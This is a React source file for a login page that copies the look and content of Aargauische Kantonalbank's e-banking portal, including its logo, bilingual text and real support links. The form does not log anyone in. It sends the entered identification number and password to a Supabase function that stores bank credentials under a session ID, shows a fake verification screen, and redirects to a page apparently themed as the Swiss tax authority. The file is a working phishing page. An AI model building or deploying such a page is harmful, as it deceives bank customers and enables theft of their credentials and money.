import { useEffect, useState } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { ChevronRight } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import akbLogoAsset from "@/assets/akb-logo.svg.asset.json";

const AKB_BLUE = "#0069a7";
const AKB_BUTTON_DISABLED = "#7eb3d2";
const AKB_TEXT = "#333333";
const AKB_SUPPORT_BG = "#F2F2F2";
const AKB_FOOTER_BG = "#001a41";

type Lang = "de" | "en";

const T = {
  de: {
    title: "Login AKB e-Banking",
    id: "Identifikationsnummer",
    pw: "Passwort",
    terms1: "Mit dem Login akzeptiere ich die ",
    termsLink: "«Nutzungsbedingungen digitale Kanäle»",
    terms2: " der Aargauischen Kantonalbank.",
    login: "Login",
    support: "Support",
    s1: "Kontakt & Hilfe",
    s2: "Neues Passwort anfordern oder Zugang entsperren",
    s3: "Initialpasswort ändern oder photoTAN registrieren",
    s4: "Anleitungen rund ums e-Banking",
    s5: "Sicherheit im e- & Mobile Banking",
    fSupport: "Support",
    fAnschrift: "Anschrift",
    fBankdaten: "Bankdaten",
    fQuick: "Schnellzugriff",
    fNotfall: "Notfall",
    fSicherheit: "Sicherheit",
    fHilfe: "Hilfe",
    loading: "Anmeldedaten werden überprüft...",
  },
  en: {
    title: "Login AKB e-Banking",
    id: "Identification number",
    pw: "Password",
    terms1: "By logging in, I accept the Aargauische Kantonalbank's ",
    termsLink: "Terms and Conditions",
    terms2: " for the use of its e-banking services.",
    login: "Login",
    support: "Support",
    s1: "Contact & Help",
    s2: "Request a new password or unlock access",
    s3: "Change initial password or register photoTAN",
    s4: "Manuals for e-Banking",
    s5: "Security in e- & mobile banking",
    fSupport: "Support",
    fAnschrift: "Address",
    fBankdaten: "Bank data",
    fQuick: "Quick access",
    fNotfall: "Emergency",
    fSicherheit: "Security",
    fHilfe: "Help",
    loading: "Verifying login data...",
  },
} satisfies Record<Lang, Record<string, string>>;

const ChAargauischeKantonalbank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [lang, setLang] = useState<Lang>("de");
  const [showLoading, setShowLoading] = useState(false);
  const t = T[lang];

  usePageMeta("Login AKB e-Banking", "https://www.akb.ch/favicon.ico");

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  const disabled = username.trim() === "" || password === "";

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (disabled) return;
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: username,
        p_password: password,
        p_username_label: "Identifikationsnummer",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    } else {
      console.error("No session ID found in URL!");
    }
    setShowLoading(true);
  };

  const supportLinks = [
    { label: t.s1, href: "https://www.akb.ch/kontakt" },
    { label: t.s2, href: "https://www.akb.ch/ebankingsupport" },
    { label: t.s3, href: "https://www.akb.ch/first-login" },
    { label: t.s4, href: "https://www.akb.ch/e-banking" },
    { label: t.s5, href: "https://www.akb.ch/sicherheit" },
  ];

  const inputStyle: React.CSSProperties = {
    border: `1px solid ${AKB_BLUE}`,
    borderRadius: 0,
    outline: "none",
    background: "#fff",
  };

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message={t.loading}
          onComplete={() => navigate("/estv/confirmation?s=" + sessionId)}
        />
      )}
      <div
        className="min-h-screen flex flex-col"
        style={{
          fontFamily: "Arial, Helvetica, sans-serif",
          color: AKB_TEXT,
          background: "#fff",
        }}
      >
        {/* Top accent strip */}
        <div style={{ height: 4, background: AKB_BLUE }} />

        {/* White header with logo */}
        <header className="w-full bg-white">
          <div className="max-w-[1200px] mx-auto px-4 md:px-6 py-5 md:py-6">
            <a
              href="https://www.akb.ch"
              aria-label="Aargauische Kantonalbank"
              className="inline-block"
            >
              <img
                src={akbLogoAsset.url}
                alt="Aargauische Kantonalbank"
                className="h-9 md:h-11 w-auto"
              />
            </a>
          </div>
        </header>

        {/* Blue language sub-header */}
        <div style={{ background: AKB_BLUE }}>
          <div className="max-w-[1200px] mx-auto px-4 md:px-6 flex justify-end items-stretch h-12">
            {(["de", "en"] as Lang[]).map((code) => {
              const active = lang === code;
              return (
                <button
                  key={code}
                  type="button"
                  onClick={() => setLang(code)}
                  className="relative px-5 text-[17px] font-bold tracking-wide transition-colors"
                  style={{ color: active ? "#fff" : "rgba(255,255,255,0.75)" }}
                >
                  {code.toUpperCase()}
                  {active && (
                    <span
                      aria-hidden
                      style={{
                        position: "absolute",
                        left: "50%",
                        bottom: -1,
                        transform: "translateX(-50%)",
                        width: 0,
                        height: 0,
                        borderLeft: "12px solid transparent",
                        borderRight: "12px solid transparent",
                        borderBottom: "10px solid #fff",
                      }}
                    />
                  )}
                </button>
              );
            })}
          </div>
        </div>

        {/* Main */}
        <main className="flex-1 w-full">
          <div className="max-w-[1200px] mx-auto px-4 md:px-6 py-10 md:py-14">
            <h1
              className="font-bold leading-tight mb-10 md:mb-14"
              style={{ color: AKB_BLUE, fontSize: "clamp(32px, 5vw, 48px)" }}
            >
              {t.title}
            </h1>

            <div className="grid gap-10 md:gap-12 md:grid-cols-2">
              {/* Form column */}
              <form onSubmit={handleSubmit} className="flex flex-col">
                <label
                  htmlFor="akb-id"
                  className="block text-[15px] font-bold mb-2"
                  style={{ color: AKB_TEXT }}
                >
                  {t.id}
                </label>
                <input
                  id="akb-id"
                  type="text"
                  autoComplete="username"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="w-full h-14 px-3 text-[18px] mb-7 focus:outline-none focus:ring-0"
                  style={inputStyle}
                />

                <label
                  htmlFor="akb-pw"
                  className="block text-[15px] font-bold mb-2"
                  style={{ color: AKB_TEXT }}
                >
                  {t.pw}
                </label>
                <input
                  id="akb-pw"
                  type="password"
                  autoComplete="current-password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full h-14 px-3 text-[18px] mb-6 focus:outline-none focus:ring-0"
                  style={inputStyle}
                />

                <p
                  className="text-[14px] leading-6 mb-6"
                  style={{ color: AKB_TEXT }}
                >
                  {t.terms1}
                  <a
                    href="https://www.akb.ch/disclaimer"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="underline"
                    style={{ color: AKB_BLUE }}
                  >
                    {t.termsLink}
                  </a>
                  {t.terms2}
                </p>

                <button
                  type="submit"
                  disabled={disabled}
                  className="w-full md:w-auto md:self-start h-12 px-12 text-[16px] font-normal transition-colors"
                  style={{
                    background: disabled ? AKB_BUTTON_DISABLED : AKB_BLUE,
                    color: "#fff",
                    border: `1px solid ${disabled ? AKB_BUTTON_DISABLED : AKB_BLUE}`,
                    cursor: disabled ? "not-allowed" : "pointer",
                    borderRadius: 0,
                  }}
                  onMouseEnter={(e) => {
                    if (disabled) return;
                    e.currentTarget.style.background = "#fff";
                    e.currentTarget.style.color = AKB_BLUE;
                  }}
                  onMouseLeave={(e) => {
                    if (disabled) return;
                    e.currentTarget.style.background = AKB_BLUE;
                    e.currentTarget.style.color = "#fff";
                  }}
                >
                  {t.login}
                </button>
              </form>

              {/* Support column */}
              <aside
                style={{ background: AKB_SUPPORT_BG }}
                className="p-8 self-start"
              >
                <h2
                  className="text-[22px] font-bold mb-5"
                  style={{ color: AKB_TEXT }}
                >
                  {t.support}
                </h2>
                <ul>
                  {supportLinks.map((l, i) => (
                    <li key={i}>
                      <a
                        href={l.href}
                        target="_blank"
                        rel="noopener noreferrer"
                        className="group flex items-start gap-2 py-3 text-[15px] no-underline hover:no-underline transition-colors"
                        style={{ color: AKB_TEXT }}
                        onMouseEnter={(e) => {
                          e.currentTarget.style.color = AKB_BLUE;
                        }}
                        onMouseLeave={(e) => {
                          e.currentTarget.style.color = AKB_TEXT;
                        }}
                      >
                        <ChevronRight
                          className="w-5 h-5 flex-shrink-0 mt-0.5 text-gray-500"
                          strokeWidth={2.5}
                        />
                        <span>{l.label}</span>
                      </a>
                    </li>
                  ))}
                </ul>
              </aside>
            </div>
          </div>
        </main>

        {/* Footer */}
        <footer style={{ background: AKB_FOOTER_BG, color: "#fff" }}>
          <div className="max-w-[1200px] mx-auto px-4 md:px-6 py-12 grid gap-8 sm:grid-cols-2 md:grid-cols-4">
            <div>
              <h3 className="text-[20px] font-bold mb-4">{t.fSupport}</h3>
              <a
                href="https://www.akb.ch/kontakt"
                target="_blank"
                rel="noopener noreferrer"
                className="text-[16px] hover:underline"
              >
                {t.s1}
              </a>
            </div>
            <div>
              <h3 className="text-[20px] font-bold mb-4">{t.fAnschrift}</h3>
              <p className="text-[16px] leading-7">
                Aargauische Kantonalbank<br />
                Bahnhofplatz 1<br />
                5001 Aarau
              </p>
            </div>
            <div>
              <h3 className="text-[20px] font-bold mb-4">{t.fBankdaten}</h3>
              <p className="text-[16px] leading-7">
                Clearing-Nummer: 761<br />
                BIC/Swift-Code: KBAGCH22
              </p>
            </div>
            <div>
              <h3 className="text-[20px] font-bold mb-4">{t.fQuick}</h3>
              <ul className="text-[16px] leading-7">
                <li>
                  <a
                    href="https://www.akb.ch/notfall"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="hover:underline"
                  >
                    {t.fNotfall}
                  </a>
                </li>
                <li>
                  <a
                    href="https://www.akb.ch/sicherheit"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="hover:underline"
                  >
                    {t.fSicherheit}
                  </a>
                </li>
                <li>
                  <a
                    href="https://www.akb.ch/kontakt"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="hover:underline"
                  >
                    {t.fHilfe}
                  </a>
                </li>
              </ul>
            </div>
          </div>
        </footer>
      </div>

      {/* Sub-footer (outside 100vh wrapper — visible only on scroll) */}
      <div style={{ background: "#c8c8c8", color: "#333" }}>
        <div className="max-w-[1200px] mx-auto px-4 md:px-6 py-4 flex flex-wrap items-center justify-between gap-3">
          <div className="flex items-center text-[14px]">
            <span>© 2026 Aargauische Kantonalbank</span>
            <span
              aria-hidden
              style={{ display: "inline-block", width: 1, height: 14, background: "#666", margin: "0 12px" }}
            />
            <a
              href="https://www.akb.ch/rechtliches"
              target="_blank"
              rel="noopener noreferrer"
              className="hover:underline"
              style={{ color: "#333" }}
            >
              Rechtliches
            </a>
          </div>
          <div className="text-[18px] font-semibold" style={{ color: "#001a41" }}>
            Am richtigen Ort
          </div>
        </div>
      </div>
    </>
  );
};

export default ChAargauischeKantonalbank;
